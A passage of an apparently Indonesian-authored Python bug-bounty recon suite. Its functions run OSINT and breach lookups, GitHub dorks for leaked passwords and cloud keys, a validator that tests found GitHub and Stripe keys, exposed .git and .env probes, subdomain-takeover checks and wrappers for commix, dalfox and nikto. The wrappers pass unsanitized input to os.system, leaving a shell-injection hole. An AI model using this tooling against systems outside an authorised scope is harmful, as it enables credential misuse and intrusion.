    target = ask("URL/Domain/IP")
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{target}&size=20", timeout=15)
        if r.status_code == 200:
            for res in r.json().get('results',[])[:20]:
                ok(res.get('page',{}).get('url','N/A'))
                info(f"  Scan ID: {res.get('_id')}"); info(f"  Link: https://urlscan.io/result/{res.get('_id')}/")
    except: pass

def securitytrails_lookup():
    voice("SecurityTrails...")
    api_key = ask("SecurityTrails API key (kosong = browser)"); domain = ask("Domain")
    if not api_key: info(f"https://securitytrails.com/domain/{domain}/dns"); return
    try:
        r = requests.get(f"https://api.securitytrails.com/v1/domain/{domain}/subdomains", headers={"APIKEY":api_key}, timeout=15)
        if r.status_code == 200:
            for s in r.json().get('subdomains',[])[:50]: info(f"  {s}.{domain}")
    except Exception as e: err(str(e))

def leakcheck_lookup():
    voice("LeakCheck...")
    api_key = ask("LeakCheck API key (kosong = browser)"); query = ask("Email/Username/Domain")
    if not api_key: info(f"https://leakcheck.io/search?query={query}"); return
    try:
        r = requests.get(f"https://leakcheck.io/api/public?key={api_key}&check={query}", timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get('success'):
                ok(f"Found in {data.get('found',0)} breaches")
                for s in data.get('sources',[])[:20]: vuln(f"{s.get('name','?')} - {s.get('date','?')}")
    except Exception as e: err(str(e))

def intelx_lookup():
    voice("IntelX...")
    api_key = ask("IntelX API key (kosong = browser)"); query = ask("Query")
    if not api_key: info(f"https://intelx.io/?s={query}"); return
    try:
        r = requests.post("https://2.intelx.io/intelligent/search", headers={"x-key":api_key}, json={"term":query,"maxresults":20}, timeout=20)
        if r.status_code == 200:
            sid = r.json().get('id'); info(f"Search ID: {sid}"); time.sleep(2)
            r2 = requests.get(f"https://2.intelx.io/intelligent/search/result?id={sid}&limit=20", headers={"x-key":api_key}, timeout=20)
            if r2.status_code == 200:
                for rec in r2.json().get('records',[])[:20]: ok(f"{rec.get('name','N/A')} - {rec.get('type')}")
    except Exception as e: err(str(e))

def opencorporates_lookup():
    voice("OpenCorporates...")
    company = ask("Company name")
    try:
        r = requests.get(f"https://api.opencorporates.com/v0.4/companies/search?q={quote(company)}", timeout=15)
        if r.status_code == 200:
            for c in r.json().get('results',{}).get('companies',[])[:15]:
                comp = c.get('company',{}); ok(comp.get('name'))
                info(f"  Jurisdiction: {comp.get('jurisdiction_code')}")
                info(f"  Company #: {comp.get('company_number')}")
                info(f"  Status: {comp.get('current_status')}")
    except Exception as e: err(str(e))

def linkedin_enum():
    voice("LinkedIn Enum...")
    company = ask("Company name")
    for d in [f'site:linkedin.com/in "{company}"', f'site:linkedin.com/in "{company}" CEO',
        f'site:linkedin.com/in "{company}" "software engineer"', f'site:linkedin.com/in "{company}" "security"',
        f'site:linkedin.com/company {company}']:
        info(d); info(f"  https://www.google.com/search?q={quote(d)}")

def wayback_urls():
    voice("Wayback URLs...")
    domain = ask("Domain")
    try:
        r = requests.get(f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=500&collapse=urlkey", timeout=30)
        if r.status_code == 200:
            data = r.json()
            if len(data) > 1:
                urls = [row[2] for row in data[1:]]
                ok(f"Found {len(urls)} URLs")
                for u in urls[:50]: info(f"  {u}")
                RESULTS["wayback_urls"] = urls[:200]
                with open(f"wayback_{domain.replace('.','_')}.txt",'w') as f: f.write('\n'.join(urls))
                ok(f"Saved: wayback_{domain.replace('.','_')}.txt")
    except Exception as e: err(str(e))

def logo_brand_search():
    voice("Logo & Brand Search...")
    brand = ask("Brand name")
    for s in [f"https://logo.clearbit.com/{brand.lower()}.com", f"https://www.brandfetch.io/{brand.lower()}.com",
        f"https://logo.dev/{brand.lower()}.com", f"https://namechk.com/?q={brand}", f"https://namecheckr.com/{brand}"]:
        info(s)

def dns_history():
    voice("DNS History...")
    domain = ask("Domain")
    for s in [f"https://securitytrails.com/domain/{domain}/history/a", f"https://viewdns.info/iphistory/?domain={domain}",
        f"https://dnsdumpster.com/", f"https://www.threatminer.org/domain.php?q={domain}"]:
        info(s)
    try:
        r = requests.get(f"https://api.threatminer.org/v2/domain.php?q={domain}&rt=2", timeout=15)
        if r.status_code == 200:
            for rec in r.json().get('results',[])[:20]: info(f"  {rec}")
    except: pass

def reverse_whois():
    voice("Reverse Whois...")
    keyword = ask("Keyword")
    try:
        r = requests.get(f"https://viewdns.info/reversewhois/?q={quote(keyword)}", headers=HEADERS, timeout=15)
        if r.status_code == 200:
            domains = re.findall(r'<td>([a-zA-Z0-9\-\.]+\.[a-z]{2,})</td>', r.text)
            for d in list(set(domains))[:30]: info(f"  {d}"); RESULTS["reverse_ip"].append(d)
    except Exception as e: err(str(e))

def github_dork():
    voice("GitHub Dork...")
    org = ask("Organization/User")
    dorks = [f'org:{org} password', f'org:{org} api_key', f'org:{org} secret',
        f'org:{org} token', f'org:{org} aws_access_key', f'org:{org} private_key',
        f'org:{org} .env', f'org:{org} filename:config']
    for d in dorks:
        info(f"  {d}"); info(f"    https://github.com/search?q={quote(d)}&type=code")

def shodan_monitor():
    voice("Shodan Monitor...")
    api_key = ask("Shodan API key"); ips = ask("IPs (pisah koma)").split(',')
    if not api_key: return
    save_file = "shodan_monitor.json"; old = {}
    if os.path.exists(save_file):
        try:
            with open(save_file) as f: old = json.load(f)
        except: pass
    new = {}
    for ip in ips:
        ip = ip.strip()
        try:
            r = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={api_key}", timeout=15)
            if r.status_code == 200:
                data = r.json()
                new[ip] = {"ports":data.get('ports',[]),"hostnames":data.get('hostnames',[]),"vulns":list(data.get('vulns',{}).keys())}
                info(f"{ip}: ports={data.get('ports')}")
                if new[ip]['vulns']: vuln(f"VULNS: {new[ip]['vulns']}")
                if ip in old:
                    new_ports = set(new[ip]['ports']) - set(old[ip].get('ports',[]))
                    if new_ports: vuln(f"NEW PORTS: {new_ports}")
        except: pass
    with open(save_file,'w') as f: json.dump(new, f, indent=2)
    ok(f"Saved: {save_file}")

def exploit_suggester():
    voice("Exploit Suggester...")
    tech = ask("Technology (contoh: apache 2.4.49)")
    try:
        r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={quote(tech)}&resultsPerPage=20", timeout=20)
        if r.status_code == 200:
            vulns = r.json().get('vulnerabilities',[]); ok(f"Found {len(vulns)} CVEs:")
            for v in vulns[:20]:
                cve = v.get('cve',{}); cve_id = cve.get('id')
                desc = cve.get('descriptions',[{}])[0].get('value','')[:150]
                score = "N/A"; m = cve.get('metrics',{})
                if 'cvssMetricV31' in m: score = m['cvssMetricV31'][0]['cvssData']['baseScore']
                elif 'cvssMetricV2' in m: score = m['cvssMetricV2'][0]['cvssData']['baseScore']
                marker = "🔥" if score != "N/A" and float(score) >= 8 else ""
                vuln(f"{cve_id} {marker} CVSS {score}"); info(f"  {desc}")
                info(f"  https://nvd.nist.gov/vuln/detail/{cve_id}")
                RESULTS["cve"].append({"id":cve_id,"score":score})
    except Exception as e: err(str(e))

def vuln_timeline():
    voice("Vuln Timeline...")
    domain = ask("Domain/Product"); days = int(ask("Days back (default 30)") or "30")
    end = datetime.now(); start = end - timedelta(days=days)
    try:
        api = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={quote(domain)}&pubStartDate={start.strftime('%Y-%m-%dT00:00:00.000')}&pubEndDate={end.strftime('%Y-%m-%dT23:59:59.999')}"
        r = requests.get(api, timeout=20)
        if r.status_code == 200:
            vulns = r.json().get('vulnerabilities',[]); ok(f"{len(vulns)} CVEs")
            for v in vulns[:20]:
                cve = v.get('cve',{}); vuln(f"{cve.get('id')} - {cve.get('published','')[:10]}")
                info(f"  {cve.get('descriptions',[{}])[0].get('value','')[:150]}")
    except Exception as e: err(str(e))

def paste_monitor():
    voice("Paste Monitor...")
    keyword = ask("Keyword"); save_file = f"paste_monitor_{keyword.replace(' ','_')}.json"
    try:
        r = requests.get(f"https://psbdmp.ws/api/v3/search/{quote(keyword)}", timeout=15)
        if r.status_code == 200:
            current = [item.get('id') for item in r.json().get('data',[])]; old = []
            if os.path.exists(save_file):
                with open(save_file) as f: old = json.load(f).get('ids',[])
            new_pastes = [p for p in current if p not in old]
            ok(f"Found {len(current)} pastes, {len(new_pastes)} NEW")
            for p in new_pastes: vuln(f"NEW: https://pastebin.com/{p}")
            with open(save_file,'w') as f: json.dump({"ids":current,"time":datetime.now().isoformat()}, f)
    except Exception as e: err(str(e))

def scope_auto_scan():
    voice("Scope Auto-Scan...")
    scope = _load_scope()
    if not scope['targets']: warn("Scope kosong."); return
    ok(f"{len(scope['targets'])} targets:")
    for t in scope['targets']: info(f"  - {t['target']}")
    if ask("Scan semua? (y/n)").lower() != 'y': return
    for t in scope['targets']:
        target = t['target']; print(f"\n{C}{'═'*55}{W}"); print(f"{C}Scanning: {target}{W}"); print(f"{C}{'═'*55}{W}")
        try:
            url = norm(target); tech_detect(url, silent=True); header_check(url, silent=True); xss_scanner(url, silent=True)
        except: pass
    save_report()

def whois_history():
    voice("Whois History...")
    domain = ask("Domain")
    for s in [f"https://whoisology.com/{domain}", f"https://www.whoisxmlapi.com/whois-history/search?domainName={domain}",
        f"https://viewdns.info/whoishistory/?domain={domain}", f"https://securitytrails.com/domain/{domain}/whois"]:
        info(f"  {s}")
    try:
        r = requests.get(f"https://viewdns.info/whoishistory/?domain={domain}", headers=HEADERS, timeout=15)
        if r.status_code == 200:
            rows = re.findall(r'<tr[^>]*>(.*?)</tr>', r.text, re.DOTALL)
            for row in rows[1:15]:
                cells = re.findall(r'<td[^>]*>([^<]+)</td>', row)
                if cells: info(f"{' | '.join(cells[:4])}")
    except: pass

def email_breach_scan():
    voice("Email Breach Bulk...")
    emails_input = ask("Emails (pisah koma atau file path)")
    if os.path.exists(emails_input):
        with open(emails_input) as f: emails = [l.strip() for l in f if l.strip()]
    else: emails = [e.strip() for e in emails_input.split(',')]
    info(f"Checking {len(emails)} emails...")
    for email in emails:
        info(f"{email}")
        try:
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers={**HEADERS,"hibp-api-key":""}, timeout=10)
            if r.status_code == 200:
                breaches = r.json(); vuln(f"Found in {len(breaches)} breaches:")
                for b in breaches[:10]: info(f"  - {b.get('Name')} ({b.get('BreachDate')})")
            elif r.status_code == 404: ok("Not found")
        except: pass
        RESULTS["email_osint"].append({"email":email})

# v10 Bugcrowd
def subfinder_wrapper():
    voice("Subfinder...")
    if not check_tool("subfinder"):
        warn("Install:"); info("go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
    if not check_tool("subfinder"): warn("Fallback ke crt.sh..."); return cert_transparency()
    domain = ask("Domain target"); info(f"Running subfinder {domain}...")
    os.system(f"subfinder -d {domain} -silent | tee subfinder_{domain}.txt")

def httpx_prober():
    voice("HTTPX...")
    if not check_tool("httpx"):
        warn("Install: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest")
    if not check_tool("httpx"): err("Tidak ada httpx"); return
    file_in = ask("File input atau URL")
    if os.path.exists(file_in): cmd = f"httpx -l {file_in} -silent -status-code -title -tech-detect -o live_hosts.txt"
    else:
        with open("tmp_targets.txt","w") as f: f.write(file_in+"\n")
        cmd = f"httpx -l tmp_targets.txt -silent -status-code -title -tech-detect"
    info("Running httpx..."); os.system(cmd)

def katana_crawler():
    voice("Katana Crawler...")
    if not check_tool("katana"):
        warn("Install: go install github.com/projectdiscovery/katana/cmd/katana@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/projectdiscovery/katana/cmd/katana@latest")
    if not check_tool("katana"): err("Tidak ada katana"); return
    url = ask("URL target"); depth = ask("Depth (default 3)") or "3"; out = ask("Output (default: katana_urls.txt)") or "katana_urls.txt"
    info(f"Crawling {url}..."); os.system(f"katana -u {url} -d {depth} -silent -o {out}"); ok(f"Saved: {out}")

def ffuf_fuzzer():
    voice("FFUF Fuzzer...")
    if not check_tool("ffuf"):
        warn("Install: go install github.com/ffuf/ffuf/v2@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/ffuf/ffuf/v2@latest")
    if not check_tool("ffuf"): err("Tidak ada ffuf"); return
    url = ask("URL (pakai FUZZ)"); wl = ask("Wordlist (default: /usr/share/wordlists/dirb/common.txt)") or "/usr/share/wordlists/dirb/common.txt"
    info(f"Fuzzing {url}..."); os.system(f"ffuf -u {url} -w {wl} -mc 200,301,302,401,403 -s")

def gau_urls():
    voice("GAU URLs...")
    if not check_tool("gau"):
        warn("Install: go install github.com/lc/gau/v2/cmd/gau@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/lc/gau/v2/cmd/gau@latest")
    if not check_tool("gau"): warn("Fallback ke wayback..."); return wayback_urls()
    domain = ask("Domain"); out = f"gau_{domain.replace('.','_')}.txt"
    info(f"Collecting {domain}..."); os.system(f"gau {domain} | tee {out}")

def js_endpoint_extractor():
    voice("JS Endpoint Extractor...")
    url = ask("URL target")
    if not url.startswith('http'): url = 'http://' + url
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        js_files += re.findall(r'["\']([^"\']+\.js)["\']', r.text); js_files = list(set(js_files))
        ok(f"Found {len(js_files)} JS files"); all_endpoints = []
        for js in js_files[:20]:
            full = urljoin(url, js)
            try:
                r2 = requests.get(full, headers=HEADERS, timeout=8)
                endpoints = re.findall(r'["\'](/[a-zA-Z0-9_\-/\.]+)["\']', r2.text)
                apis = re.findall(r'["\'](https?://[^"\']+)["\']', r2.text)
                for ep in set(endpoints):
                    if 3 < len(ep) < 100: all_endpoints.append(ep)
                for api in set(apis): all_endpoints.append(api)
            except: pass
        all_endpoints = list(set(all_endpoints))
        vuln(f"Total {len(all_endpoints)} endpoints:")
        for ep in all_endpoints[:80]: info(f"  {ep}")
        RESULTS["js_endpoints"] = all_endpoints
        with open("js_endpoints.txt","w") as f: f.write('\n'.join(all_endpoints))
        ok("Saved: js_endpoints.txt")
    except Exception as e: err(str(e))

def param_spider():
    voice("ParamSpider...")
    if not check_tool("paramspider"):
        warn("ParamSpider manual:"); info("git clone https://github.com/devanshbatham/ParamSpider")
        domain = ask("Domain")
        try:
            r = requests.get(f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=2000&collapse=urlkey", timeout=30)
            if r.status_code == 200:
                params = set()
                for row in r.json()[1:]:
                    if '?' in row[2]:
                        for p in row[2].split('?')[1].split('&'):
                            if '=' in p: params.add(p.split('=')[0])
                ok(f"Found {len(params)} unique parameters:")
                for p in sorted(params)[:80]: info(f"  {p}")
                RESULTS["params"] = list(params)
        except Exception as e: err(str(e))
        return
    domain = ask("Domain"); out = f"params_{domain.replace('.','_')}.txt"
    os.system(f"paramspider -d {domain} --output {out}")

def subdomain_takeover_advanced():
    voice("Subdomain Takeover Advanced...")
    subs_file = ask("File list subdomains")
    subs = []
    if os.path.exists(subs_file):
        with open(subs_file) as f: subs = [l.strip() for l in f if l.strip()]
    else: subs = [subs_file]
    fingerprints = {"github.io":["There isn't a GitHub Pages site here","404 there is no"],
        "herokuapp.com":["No such app"], "s3.amazonaws.com":["NoSuchBucket","The specified bucket does not exist"],
        "azurewebsites.net":["Error 404 - Web app not found"], "cloudfront.net":["Bad request"],
        "fastly.net":["Fastly error: unknown domain"], "shopify.com":["Sorry, this shop is currently unavailable"],
        "tumblr.com":["Whatever you were looking for doesn't currently exist"], "wordpress.com":["Do you want to register"],
        "zendesk.com":["Help Center Closed"], "readthedocs.io":["unknown to Read the Docs"],
        "surge.sh":["project not found"], "bitbucket.io":["Repository not found"]}
    for sub in subs:
        sub_url = sub if sub.startswith('http') else f"http://{sub}"
        try:
            r = requests.get(sub_url, headers=HEADERS, timeout=8, allow_redirects=False)
            for svc, sigs in fingerprints.items():
                for sig in sigs:
                    if sig.lower() in r.text.lower():
                        vuln(f"TAKEOVER: {sub} -> {svc}"); RESULTS["takeover"].append({"subdomain":sub,"service":svc}); break
        except: pass
    ok(f"Selesai. {len(RESULTS['takeover'])} takeovers.")

def screenshot_taker():
    voice("Screenshot Taker...")
    if not check_tool("cutycapt") and not check_tool("wkhtmltoimage"):
        warn("Install: apt install cutycapt wkhtmltopdf")
        if ask("Install wkhtmltopdf? (y/n)").lower() == 'y': os.system("sudo apt install wkhtmltopdf -y 2>/dev/null")
    url = ask("URL target"); out = ask("Output (default: screenshot.png)") or "screenshot.png"
    info(f"Capturing {url}...")
    if check_tool("cutycapt"): os.system(f"cutycapt --url={url} --out={out}")
    elif check_tool("wkhtmltoimage"): os.system(f"wkhtmltoimage {url} {out}")
    else: err("Tidak ada tool"); return
    if os.path.exists(out): ok(f"Saved: {out} ({os.path.getsize(out)} bytes)")

def vuln_correlator():
    voice("Vuln Correlator...")
    vrt_map = {"xss":{"severity":"P2-P3","vrt":"Cross-Site Scripting"},
        "sql":{"severity":"P1-P2","vrt":"SQL Injection"}, "lfi":{"severity":"P1","vrt":"Local File Inclusion"},
        "rfi":{"severity":"P1","vrt":"Remote File Inclusion"}, "ssrf":{"severity":"P1-P2","vrt":"SSRF"},
        "open_redirect":{"severity":"P4-P5","vrt":"Open Redirect"}, "cors":{"severity":"P3-P4","vrt":"CORS Misconfiguration"},
        "csrf":{"severity":"P3-P4","vrt":"CSRF"}, "leaked_env":{"severity":"P1","vrt":"Sensitive Info Disclosure"},
        "admin_panels":{"severity":"P3-P4","vrt":"Exposed Admin Panel"}, "takeover":{"severity":"P2-P3","vrt":"Subdomain Takeover"},
        "api_keys":{"severity":"P1","vrt":"API Key Exposure"}, "s3_buckets":{"severity":"P2-P3","vrt":"S3 Misconfiguration"},
        "graphql":{"severity":"P4","vrt":"GraphQL Introspection"}, "jwt":{"severity":"P2-P3","vrt":"JWT"},
        "post_exploit":{"severity":"P1-P2","vrt":"Actuator Exposure"}}
    total = 0
    for key, info_ in vrt_map.items():
        count = len(RESULTS.get(key, []))
        if count > 0: vuln(f"{info_['vrt']} ({info_['severity']}) - {count}"); total += count
    ok(f"Total reportable: {total}")
    info("VRT: https://bugcrowd.com/vulnerability-rating-taxonomy")
    with open("bugcrowd_report.json","w") as f: json.dump({k: RESULTS.get(k, []) for k in vrt_map.keys()}, f, indent=2)

def bugcrowd_report():
    voice("Bugcrowd Report...")
    title = ask("Title"); target = ask("Target URL"); severity = ask("Severity (P1/P2/P3/P4/P5)"); description = ask("Description")
    detected = [f"{k}: {len(v)}" for k,v in RESULTS.items() if isinstance(v, list) and len(v) > 0 and k not in ['scan_log','scope']]
    report = f"""# Bugcrowd Vulnerability Report

## Title
{title}
## Target
{target}
## Severity
{severity}
## Vulnerability Type
{', '.join(detected[:5]) if detected else 'N/A'}
## Description
{description}
## Steps to Reproduce
1. Navigate to {target}
2. ...
3. ...
## Impact
[Impact]
## Remediation
[Fix]
## References
- VRT: https://bugcrowd.com/vulnerability-rating-taxonomy

---
NOXA Suite v12.0 | Arif Hidayatullah | +62881012765716
"""
    fname = f"bugcrowd_report_{int(time.time())}.md"
    with open(fname, "w") as f: f.write(report)
    ok(f"Report saved: {fname}")

def bugcrowd_scope_check():
    voice("Bugcrowd Scope Checker...")
    scopes = [s.strip().lower() for s in ask("Scope (pisah koma)").split(',') if s.strip()]
    target = ask("Target to check").lower()
    target_domain = target.replace('http://','').replace('https://','').split('/')[0]
    for s in scopes:
        if s in target_domain or target_domain.endswith(s) or target_domain == s:
            return ok(f"IN SCOPE: {target}")
    err(f"OUT OF SCOPE: {target}"); warn("DO NOT scan out-of-scope!")

def bugcrowd_safe_scan():
    voice("Bugcrowd Safe Scan...")
    url = norm(ask("URL target (in-scope only!)")); RESULTS["target"] = url
    tasks = [("Tech",lambda:tech_detect(url,silent=True)),("Headers",lambda:header_check(url,silent=True)),
        ("Robots",lambda:robots_parser_auto(url)),("Sitemap",lambda:sitemap_parser_auto(url)),
        ("SSL",lambda:ssl_info(urlparse(url).netloc.split(':')[0],silent=True)),
        ("Cookies",lambda:cookie_analyzer(url,silent=True)),("Sourcemap",lambda:sourcemap_hunter(url,silent=True)),
        ("API",lambda:api_discovery_auto(url)),("JS",lambda:js_extractor_auto(url)),
        ("Git",lambda:git_exposure_auto(url)),("Backup",lambda:backup_finder_auto(url)),
        ("Env",lambda:env_leak_scan(url,silent=True))]
    for i,(name,func) in enumerate(tasks,1):
        info(f"[{i}/{len(tasks)}] {name}")
        try: func()
        except Exception as e: err(f"{name}: {e}")
    save_report(); ok("Safe scan done.")

def robots_parser_auto(url):
    try:
        r = requests.get(urljoin(url, '/robots.txt'), headers=HEADERS, timeout=8)
        if r.status_code == 200: ok(f"robots.txt ({len(r.text)} bytes)"); RESULTS["utils"].append({"type":"robots","content":r.text[:2000]})
    except: pass
def sitemap_parser_auto(url):
    try:
        r = requests.get(urljoin(url, '/sitemap.xml'), headers=HEADERS, timeout=8)
        if r.status_code == 200: urls = re.findall(r'<loc>([^<]+)</loc>', r.text); ok(f"sitemap.xml ({len(urls)} URLs)")
    except: pass
def api_discovery_auto(url):
    for p in ['/api','/api/v1','/api/v2','/graphql','/swagger.json','/openapi.json','/api-docs']:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code in [200,201,401,403]: ok(f"{p} ({r.status_code})")
        except: pass
def js_extractor_auto(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        ok(f"JS: {len(set(js_files))} files")
    except: pass
def git_exposure_auto(url):
    for p in ['/.git/HEAD','/.git/config']:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.text) > 5: vuln(f"{p} exposed"); RESULTS["leaked_env"].append({"path":p})
        except: pass
def backup_finder_auto(url):
    for f in ['backup.sql','.env','config.php.bak','db.sql']:
        try:
            r = requests.get(url+"/"+f, headers=HEADERS, timeout=4)
            if r.status_code == 200 and len(r.text) > 10: vuln(f"/{f} exposed"); RESULTS["leaked_env"].append({"path":f"/{f}"})
        except: pass

def cve_poc_finder():
    voice("CVE PoC Finder...")
    cve = ask("CVE ID")
    for s in [f"https://github.com/search?q={cve}&type=repositories", f"https://www.exploit-db.com/search?cve={cve.replace('CVE-','')}",
        f"https://packetstormsecurity.com/search/?q={cve}", f"https://vulners.com/search?query={cve}", f"https://nvd.nist.gov/vuln/detail/{cve}"]:
        info(s)
    try:
        r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}", timeout=15)
        if r.status_code == 200:
            vulns = r.json().get('vulnerabilities',[])
            if vulns:
                cve_data = vulns[0].get('cve',{})
                ok("Description:"); info(f"  {cve_data.get('descriptions',[{}])[0].get('value','N/A')}")
                for ref in cve_data.get('references',[])[:10]: info(f"  {ref.get('url','')}")
    except: pass

def bugcrowd_vdp_finder():
    voice("VDP Finder...")
    for s in ["https://bugcrowd.com/programs?engagement=public", "https://bugcrowd.com/programs?category=vdp",
        "https://hackerone.com/directory/programs", "https://yeswehack.com/programs", "https://intigriti.com/programs", "https://openbugbounty.org"]:
        info(s)

def dupe_checker():
    voice("Dupe Checker...")
    query = ask("Bug description")
    for s in [f"https://www.google.com/search?q=site:bugcrowd.com+{quote(query)}+disclosure",
        f"https://www.google.com/search?q=site:hackerone.com+{quote(query)}+report",
        f"https://www.google.com/search?q={quote(query)}+CVE",
        f"https://github.com/search?q={quote(query)}+bug+bounty+writeup"]:
        info(f"  {s}")

def program_chooser():
    voice("Program Chooser...")
    info("[1] Pemula: VDP (gratis, aman)")
    info("[2] Low-hanging fruit: scope besar, reward kecil")
    info("[3] High reward: P1/P2 besar, kompetitif")
    ok("Rekomendasi pemula:")
    for s in ["Tesla VDP", "Apple VDP", "Google VDP", "Yahoo (bugcrowd)", "Starbucks (bugcrowd)"]: info(f"  - {s}")

def cve_monitor():
    voice("CVE Monitor...")
    keyword = ask("Vendor/product"); days = int(ask("Days back (default 7)") or "7")
    end = datetime.now(); start = end - timedelta(days=days)
    try:
        api = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={quote(keyword)}&pubStartDate={start.strftime('%Y-%m-%dT00:00:00.000')}&pubEndDate={end.strftime('%Y-%m-%dT23:59:59.999')}"
        r = requests.get(api, timeout=20)
        if r.status_code == 200:
            vulns = r.json().get('vulnerabilities',[]); ok(f"{len(vulns)} CVEs:")
            for v in vulns[:30]:
                cve = v.get('cve',{}); cve_id = cve.get('id')
                desc = cve.get('descriptions',[{}])[0].get('value','')[:180]
                score = "N/A"; metrics = cve.get('metrics',{})
                if 'cvssMetricV31' in metrics: score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                vuln(f"{cve_id} (CVSS: {score}) - {cve.get('published','')[:10]}"); info(f"  {desc}")
                RESULTS["cve"].append({"id":cve_id,"score":score})
    except Exception as e: err(str(e))

def api_key_validator():
    voice("API Key Validator...")
    key_type = ask("Type (aws/github/stripe/google/sendgrid/slack)"); key = ask("API key")
    if key_type.lower() == "github":
        try:
            r = requests.get("https://api.github.com/user", headers={"Authorization": f"token {key}"}, timeout=8)
            if r.status_code == 200: vuln(f"VALID GitHub! User: {r.json().get('login')}")
            else: ok("Invalid")
        except: pass
    elif key_type.lower() == "stripe":
        try:
            r = requests.get("https://api.stripe.com/v1/charges", auth=(key, ""), timeout=8)
            if r.status_code == 200: vuln("VALID Stripe!")
            else: ok("Invalid")
        except: pass
    elif key_type.lower() == "aws": info("AWS: aws sts get-caller-identity")
    else: warn(f"Manual validation for {key_type}")

def subdomain_permutation():
    voice("Subdomain Permutation...")
    domain = ask("Domain"); subs_input = ask("Base subdomains (pisah koma atau file)")
    base_subs = []
    if os.path.exists(subs_input):
        with open(subs_input) as f: base_subs = [l.strip() for l in f if l.strip()]
    else: base_subs = [s.strip() for s in subs_input.split(',') if s.strip()]
    permutations = set()
    suffixes = ['dev','staging','test','prod','api','admin','backup','old','new','v2','v3','internal','external','beta','alpha','stage','uat','qa']
    for base in base_subs:
        base_clean = base.replace(f".{domain}", "")
        for suffix in suffixes:
            permutations.add(f"{base_clean}-{suffix}.{domain}")
            permutations.add(f"{suffix}-{base_clean}.{domain}")
            permutations.add(f"{base_clean}.{suffix}.{domain}")
    perms_list = list(permutations); ok(f"Generated {len(perms_list)} permutations")
    out = f"permutations_{domain.replace('.','_')}.txt"
    with open(out, "w") as f: f.write('\n'.join(perms_list))
    ok(f"Saved: {out}")
    if check_tool("httpx"):
        if ask("Probe with httpx? (y/n)").lower() == 'y':
            os.system(f"httpx -l {out} -silent -status-code -title -o perm_live.txt")

def api_fuzzer():
    voice("API Fuzzer...")
    base = ask("API base URL (contoh: https://api.target.com/v1)")
    if not base.startswith('http'): base = 'https://' + base
    endpoints = ['/users','/user/1','/admin','/config','/settings','/me','/profile','/login','/register',
        '/token','/auth','/upload','/download','/search','/data','/items','/products','/orders','/payments']
    for ep in endpoints:
        for m in ['GET','POST','OPTIONS']:
            try:
                r = requests.request(m, base+ep, headers=HEADERS, timeout=5, allow_redirects=False)
                if r.status_code not in [404, 405, 502, 503]:
                    ok(f"{m} {ep} -> {r.status_code} ({len(r.text)}b)")
                    if r.status_code == 200 and ('json' in r.headers.get('Content-Type','').lower() or r.text.strip().startswith(('[','{'))):
                        vuln(f"JSON! {r.text[:150]}"); RESULTS["utils"].append({"type":"api_data","endpoint":base+ep})
            except: pass

def vdp_scope_scan():
    voice("VDP Scope Scan...")
    warn("Recon only, aman untuk VDP")
    url = norm(ask("URL target")); host = urlparse(url).netloc.split(':')[0]
    tasks = [("Tech",lambda:tech_detect(url,silent=True)),("WHOIS",lambda:whois_lookup(host,silent=True)),
        ("DNS",lambda:dns_lookup(host,silent=True)),("GeoIP",lambda:geoip(host,silent=True)),
        ("SSL",lambda:ssl_info(host,silent=True)),("Headers",lambda:header_check(url,silent=True)),
        ("Cookies",lambda:cookie_analyzer(url,silent=True)),("robots",lambda:robots_parser_auto(url)),
        ("sitemap",lambda:sitemap_parser_auto(url)),("Wayback",lambda:wayback(url,silent=True))]
    for i,(name,func) in enumerate(tasks,1):
        info(f"[{i}/{len(tasks)}] {name}")
        try: func()
        except: pass
    save_report(); ok("VDP scan done.")

# ============================================================
# v12 NEW FEATURES (168-197)
# ============================================================
def dalfox_xss():
    voice("Dalfox XSS Scanner...")
    if not check_tool("dalfox"):
        warn("Install: go install github.com/hahwul/dalfox/v2@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/hahwul/dalfox/v2@latest")
    if not check_tool("dalfox"): err("Tidak ada dalfox"); return
    url = ask("URL target")
    info(f"Running dalfox {url}...")
    os.system(f"dalfox url {url} --silence --no-color")

def commix_scanner():
    voice("Commix Command Injection...")
    if not check_tool("commix"):
        warn("Commix tidak ada. Install: apt install commix")
        if ask("Install? (y/n)").lower() == 'y': os.system("sudo apt install commix -y 2>/dev/null")
    if not check_tool("commix"): err("Tidak ada commix"); return
    url = ask("URL target (?param=value)")
    info(f"Running commix {url}...")
    os.system(f"commix --url='{url}' --batch")

def nikto_scanner():
    voice("Nikto Web Scanner...")
    if not check_tool("nikto"):
        warn("Install: apt install nikto")
        if ask("Install? (y/n)").lower() == 'y': install_tool("nikto")
    if not check_tool("nikto"): err("Tidak ada nikto"); return
    url = ask("URL target")
    info(f"Running nikto {url}...")
    os.system(f"nikto -h {url} -nointeractive | tee nikto_{int(time.time())}.txt")

def gobuster_dirbust():
    voice("Gobuster Directory Brute...")
    if not check_tool("gobuster"):
